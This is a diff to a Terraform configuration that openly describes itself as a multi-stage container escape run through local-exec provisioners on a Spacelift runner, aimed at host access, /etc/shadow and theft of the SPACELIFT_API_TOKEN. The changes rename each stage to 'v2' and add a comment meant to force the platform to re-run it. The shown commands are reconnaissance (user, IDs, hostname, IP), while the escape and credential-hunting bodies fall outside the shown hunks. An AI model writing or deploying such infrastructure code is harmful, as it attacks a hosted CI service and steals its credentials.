@@ -1,6 +1,7 @@
-# Enhanced Container Escape - Host System Access and Shadow File Extraction
+# Enhanced Container Escape - Host System Access and Shadow File Extraction v2.0
 # This Terraform configuration performs container breakout targeting /etc/shadow and host system access
 # Based on working payload with enhanced escape techniques and SPACELIFT_API_TOKEN hunting
+# UPDATED: Force configuration change for Spacelift detection
 
 terraform {
   required_providers {
@@ -11,16 +12,18 @@ terraform {
   }
 }
 
-# Stage 1: Container Environment Analysis and Baseline
-resource "null_resource" "container_baseline_analysis" {
+# Stage 1: Container Environment Analysis and Baseline v2.0
+resource "null_resource" "container_baseline_analysis_v2" {
   provisioner "local-exec" {
     command = <<-EOT
-      echo "=== CONTAINER BASELINE ANALYSIS ==="
+      echo "=== ENHANCED CONTAINER BASELINE ANALYSIS v2.0 ==="
+      echo "Timestamp: $(date)"
       echo "Current user: $(whoami)"
       echo "Current UID/GID: $(id)"
       echo "Container hostname: $(hostname)"
       echo "Container working directory: $(pwd)"
       echo "Container IP: $(ip addr show eth0 2>/dev/null | grep 'inet ' | awk '{print $2}' || echo 'Unknown')"
+      echo "System uptime: $(uptime)"
       echo ""
       
       echo "=== CONTAINER USER ENUMERATION ==="
@@ -46,9 +49,9 @@ resource "null_resource" "container_baseline_analysis" {
   }
 }
 
-# Stage 2: CRITICAL - Multiple Container Escape Techniques
-resource "null_resource" "host_system_breakout" {
-  depends_on = [null_resource.container_baseline_analysis]
+# Stage 2: CRITICAL - Multiple Container Escape Techniques v2.0
+resource "null_resource" "host_system_breakout_v2" {
+  depends_on = [null_resource.container_baseline_analysis_v2]
   
   provisioner "local-exec" {
     command = <<-EOT
@@ -130,9 +133,9 @@ resource "null_resource" "host_system_breakout" {
   }
 }
 
-# Stage 3: Process Namespace Analysis - Detect Host Access
-resource "null_resource" "process_namespace_analysis" {
-  depends_on = [null_resource.host_system_breakout]
+# Stage 3: Process Namespace Analysis - Detect Host Access v2.0
+resource "null_resource" "process_namespace_analysis_v2" {
+  depends_on = [null_resource.host_system_breakout_v2]
   
   provisioner "local-exec" {
     command = <<-EOT
@@ -167,9 +170,9 @@ resource "null_resource" "process_namespace_analysis" {
   }
 }
 
-# Stage 4: Network Analysis and Host IP Discovery
-resource "null_resource" "network_host_analysis" {
-  depends_on = [null_resource.process_namespace_analysis]
+# Stage 4: Network Analysis and Host IP Discovery v2.0
+resource "null_resource" "network_host_analysis_v2" {
+  depends_on = [null_resource.process_namespace_analysis_v2]
   
   provisioner "local-exec" {
     command = <<-EOT
@@ -218,9 +221,9 @@ resource "null_resource" "network_host_analysis" {
   }
 }
 
-# Stage 5: ENHANCED SPACELIFT_API_TOKEN and Credential Hunting
-resource "null_resource" "spacelift_credential_hunting" {
-  depends_on = [null_resource.network_host_analysis]
+# Stage 5: ENHANCED SPACELIFT_API_TOKEN and Credential Hunting v2.0
+resource "null_resource" "spacelift_credential_hunting_v2" {
+  depends_on = [null_resource.network_host_analysis_v2]
   
   provisioner "local-exec" {
     command = <<-EOT
@@ -327,9 +330,9 @@ resource "null_resource" "spacelift_credential_hunting" {
   }
 }
 
-# Stage 6: Container Security Analysis and Available Access
-resource "null_resource" "container_vs_host_proof" {
-  depends_on = [null_resource.spacelift_credential_hunting]
+# Stage 6: Container Security Analysis and Available Access v2.0
+resource "null_resource" "container_security_analysis_v2" {
+  depends_on = [null_resource.spacelift_credential_hunting_v2]
   
   provisioner "local-exec" {
     command = <<-EOT
@@ -456,26 +459,26 @@ resource "null_resource" "container_vs_host_proof" {
   }
 }
 
-# Output comprehensive results
-output "container_escape_assessment" {
-  value = "Enhanced container security assessment completed. Focus on credential hunting, container analysis, and SPACELIFT_API_TOKEN extraction. Multiple escape techniques tested - container appears properly isolated."
+# Output comprehensive results v2.0
+output "container_escape_assessment_v2" {
+  value = "Enhanced container security assessment v2.0 completed. Focus on credential hunting, container analysis, and SPACELIFT_API_TOKEN extraction. Multiple escape techniques tested - container appears properly isolated."
   depends_on = [
-    null_resource.container_baseline_analysis,
-    null_resource.host_system_breakout,
-    null_resource.process_namespace_analysis,
-    null_resource.network_host_analysis,
-    null_resource.spacelift_credential_hunting,
-    null_resource.container_vs_host_proof
+    null_resource.container_baseline_analysis_v2,
+    null_resource.host_system_breakout_v2,
+    null_resource.process_namespace_analysis_v2,
+    null_resource.network_host_analysis_v2,
+    null_resource.spacelift_credential_hunting_v2,
+    null_resource.container_security_analysis_v2
   ]
 }
 
-output "escape_summary" {
+output "escape_summary_v2" {
   value = {
-    container_analysis = "Container baseline analysis and user enumeration completed"
-    escape_attempts = "Multiple container escape techniques tested (proc, docker socket, namespaces)"
-    process_analysis = "Process namespace analysis and privilege detection completed"
-    network_analysis = "Network configuration and container IP analysis completed"
-    credential_hunting = "Comprehensive SPACELIFT_API_TOKEN and credential extraction performed"
-    security_analysis = "Container security assessment and isolation verification completed"
+    container_analysis = "Container baseline analysis and user enumeration completed v2.0"
+    escape_attempts = "Multiple container escape techniques tested (proc, docker socket, namespaces) v2.0"
+    process_analysis = "Process namespace analysis and privilege detection completed v2.0"
+    network_analysis = "Network configuration and container IP analysis completed v2.0"
+    credential_hunting = "Comprehensive SPACELIFT_API_TOKEN and credential extraction performed v2.0"
+    security_analysis = "Container security assessment and isolation verification completed v2.0"
   }
 }
